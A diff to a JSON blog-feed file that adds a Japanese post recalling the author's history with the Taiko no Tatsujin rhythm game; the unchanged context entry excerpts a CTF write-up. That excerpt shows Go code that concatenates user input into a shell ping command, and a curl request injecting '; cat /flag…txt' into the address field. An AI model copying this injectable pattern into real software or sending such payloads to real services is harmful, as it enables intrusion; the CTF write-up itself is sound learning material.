@@ -3834,6 +3834,21 @@
       "siteUrl": "https://naari.hatenablog.com/",
       "articles": [
         {
+          "id": "hatenablog://entry/13574176438099839426",
+          "author": null,
+          "description": "最近、僕の中で太鼓の達人がアツい。僕の定かでない幼少期の記憶のうち、初めてやったゲームとして候補に挙げられるゲームでもある「太鼓の達人」が、今になってブームを巻き起こしている。これで3回目になるんだけど、一回その頃の話を掘り起こしてみたい。\n本当に小さい頃、PS2に出ていた「太鼓の達人 タタコンでドドンがドン」(俗称 CS1) をやっていた記憶がある。が、CS1のディスクは自分が足で踏みながら廊下を刷り歩いてしまったらしく、再起不能になったらしい。その後CS2~5あたりまでやって、それぞれのタイトルに思い入れがある状態になっている。特に、小さかった頃の自分にはミニゲームがお気に入りだったらしく、各タイトルも譜面よりそちらの思い入れのほうが強い。特にCS4のミニゲーム全てとCS2のギャラドン、CS1のマラソンと100M走は今でも情景が浮かんでくる。\nwww.youtube.com\nwww.youtube.com\nwww.youtube.com\nwww.youtube.com\nその後、小学4年生くらい？に再ブームが訪れる。どこかのフードコートに併設されていたゲームセンターでの話で、「どれか一つ一回ならやってもいいよ」と言われ100円を渡される。自分はなにか適当なビデオゲームを1クレジットやって終了させたのだが、弟は太鼓の達人を選択していた。この店の設定は1クレジット200円だったのだが、親はそれを許容し、追加で100円を渡す。これを僕は不平だと訴えたが、特に聞き入られることはなく流されたことをよく覚えている。これを不満に思った僕は、それ以降しばらくはゲームセンターに行く度に毎回太鼓の達人をやるようになってしまった。執着しているうちに普通にハマってしまい、それが中学生終了時期まで続いた*1。当時はAC11か12~新筐体稼働後1年くらい？だった気がする。技量としては(当時基準の)鬼…",
+          "link": "https://naari.hatenablog.com/entry/2022/06/13/101325",
+          "publishedOn": "2022-06-13T01:13:25.000Z",
+          "wordCount": 121,
+          "title": "ドンゲー雑記",
+          "enclosure": {
+            "url": "https://cdn.blog.st-hatena.com/images/theme/og-image-1500.png",
+            "type": "image/png",
+            "length": "0"
+          },
+          "imageUrl": "https://cdn.blog.st-hatena.com/images/theme/og-image-1500.png"
+        },
+        {
           "id": "hatenablog://entry/13574176438099321773",
           "author": null,
           "description": "あ\n数年ぶりにCTFをやりたい気持ちになって、身内のSlackで「なんかやりたい」って言ったらいつの間にか参加が確定していた。\n突然投げられたチーム登録用パスワード\nWeb\nUtil\npingを投げる対象にコマンドインジェクションできる部分があった。\n   r.POST(\"/util/ping\", func(c *gin.Context) {\n        var param IP\n        if err := c.Bind(&param); err != nil {\n            c.JSON(400, gin.H{\"message\": \"Invalid parameter\"})\n            return\n        }\n\n        commnd := \"ping -c 1 -W 1 \" + param.Address + \" 1>&2\"\n        result, _ := exec.Command(\"sh\", \"-c\", commnd).CombinedOutput()\n\n        c.JSON(200, gin.H{\n            \"result\": string(result),\n        })\n    })\n\n\n\nただ、これを受け取るフロントではIPアドレスらしき値以外はすべて弾く処理が入っていたので、curlあたりで雑にリクエストを投げ、終了。\n$ curl 'https://util.quals.beginners.seccon.jp/util/ping' -H 'Content-Type: application/json' --data-raw '{\"address\":\"127.0.0.1; cat /flag_A74FIBkN9sELAjOc.txt\"}'\n// => {\"result\"…",
